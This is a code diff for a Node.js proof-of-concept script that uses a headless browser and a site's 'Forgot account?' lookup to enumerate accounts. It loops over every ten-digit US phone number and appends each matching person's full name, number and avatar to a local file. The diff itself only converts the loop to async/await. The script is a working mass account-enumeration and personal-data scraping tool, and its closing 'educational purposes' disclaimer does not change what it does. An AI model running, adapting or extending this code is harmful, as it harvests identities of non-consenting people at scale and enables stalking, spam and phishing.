@@ -17,7 +17,6 @@ const browser = Nightmare({show: true})
 /**
  * Find an account with the given phone number via "Forgot account?"
  * @param number: {Number} phone number
- * @return {Object} account
  */
 
 function findAccount(number) {
@@ -72,32 +71,31 @@ function findAccount(number) {
  * Find accounts and store them in a file.
  */
 
-function findFriends() {
+async function findFriends() {
   let countryCode = '+1';
+  let numberLength = 10;
   let start = 0, end = 9999999999;
 
-  Promise.coroutine(function*() {
-    for (let i = start; i <= end; ++i) {
-      console.log(countryCode + (i).zfill(10));
+  for (let i = start; i <= end; ++i) {
+    console.log(countryCode + (i).zfill(numberLength));
 
-      let result = yield findAccount(countryCode + i.zfill(10));
-      if (result.name) {
-        console.log(result);
-        // save data to the file
-        let stream = fs.createWriteStream('data.txt', {'flags': 'a'});
-        stream.once('open', () => {
-          stream.write('Full Name: ' + result.name + '\n');
-          stream.write('Phone Number: ' + result.number + '\n');
-          stream.write('Avatar: ' + result.avatar + '\n\n');
-          stream.end();
-        });
-      }
+    let result = await findAccount(countryCode + i.zfill(numberLength));
+    if (result.name) {
+      console.log(result);
+      // save data to the file
+      let stream = fs.createWriteStream('data.txt', {'flags': 'a'});
+      stream.once('open', () => {
+        stream.write('Full Name: ' + result.name + '\n');
+        stream.write('Phone Number: ' + result.number + '\n');
+        stream.write('Avatar: ' + result.avatar + '\n\n');
+        stream.end();
+      });
     }
+  }
 
-    yield browser.end();
-  })();
+  await browser.end();
 }
 
-// This is a Proof of Concept.
-// The information provided here is for educational purposes only.
+// This is a Proof of Concept. The information provided 
+// here is for educational purposes only.
 findFriends();
